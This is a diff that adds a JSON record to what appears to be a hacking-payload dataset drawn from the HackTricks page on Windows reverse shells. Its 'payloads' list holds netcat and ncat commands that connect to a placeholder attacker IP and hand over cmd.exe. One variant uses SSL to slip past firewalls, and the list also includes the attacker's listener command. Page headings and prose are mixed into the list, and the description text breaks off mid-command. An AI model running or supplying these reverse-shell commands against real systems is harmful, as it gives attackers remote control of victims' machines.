@@ -1,0 +1,27 @@
+{
+  "id": "generic_hacking_8634f06570d3",
+  "category": "generic-hacking",
+  "title": "windows",
+  "description": "# Shells - Windows\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Lolbas\n\nThe page [lolbas-project.github.io](https://lolbas-project.github.io/) is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io/) is for linux.\\\nObviously, **there aren't SUID files or sudo privileges in Windows**, but it's useful to know **how** some **binaries** can be (ab)used to perform some kind of unexpected actions like **execute arbitrary code.**\n\n## NC\n\n```bash\nnc.exe -e cmd.exe <Attack",
+  "payloads": [
+    "# Shells - Windows",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "## Lolbas",
+    "The page [lolbas-project.github.io](https://lolbas-project.github.io/) is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io/) is for linux.\\",
+    "Obviously, **there aren't SUID files or sudo privileges in Windows**, but it's useful to know **how** some **binaries** can be (ab)used to perform some kind of unexpected actions like **execute arbitrary code.**",
+    "```bash",
+    "nc.exe -e cmd.exe <Attacker_IP> <PORT>",
+    "## NCAT",
+    "victim",
+    "ncat.exe <Attacker_IP> <PORT>  -e \"cmd.exe /c (cmd.exe  2>&1)\"",
+    "#Encryption to bypass firewall",
+    "ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e \"cmd.exe /c (cmd.exe  2>&1)\"",
+    "attacker",
+    "ncat -l <PORT>",
+    "#Encryption to bypass firewall"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/generic-hacking/reverse-shells/windows.md"
+  ]
+}
